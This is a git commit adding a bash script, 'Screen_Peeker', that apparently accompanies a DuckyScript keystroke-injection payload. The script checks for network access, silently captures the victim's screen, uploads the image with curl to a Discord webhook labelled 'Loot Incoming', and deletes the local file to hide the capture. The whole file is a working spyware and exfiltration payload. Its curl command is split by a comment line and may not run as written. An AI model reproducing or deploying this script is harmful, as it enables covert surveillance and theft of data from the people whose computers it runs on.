f0fa112e5393e804f2c30299ce4c368e854b2362
OSINTI4L <207463242+OSINTI4L@users.noreply.github.com>
2025-05-18 08:33:05 -0500

    Add files via upload

---
+++ Payloads/Screen_Peeker/.sp.sh
@@ -0,0 +1,18 @@
+# Screen_Peeker bash script to accompany Screen_Peeker DuckyScript payload.txt
+# Checks to see if internet connectivity is present, captures screenshot, and exfiltrates via Discord webhook.
+#!/bin/bash
+net_check() {
+	ping -c 1 hak5.org
+}
+user="$(whoami)"
+
+if net_check; then
+	xfce4-screenshooter --display=:0 -f -m -s ~/.screen_peeker.png
+	curl -X POST -H "Content-Type: multipart/form-data" \
+	-F "file=@/home/$user/.screen_peeker.png" \
+    -F "content=$ Loot Incoming $" \
+# DISCORD WEBHOOK PLACED HERE VIA DUCKYSCRIPT.
+	rm ~/.screen_peeker.png
+else
+    exit 0
+fi
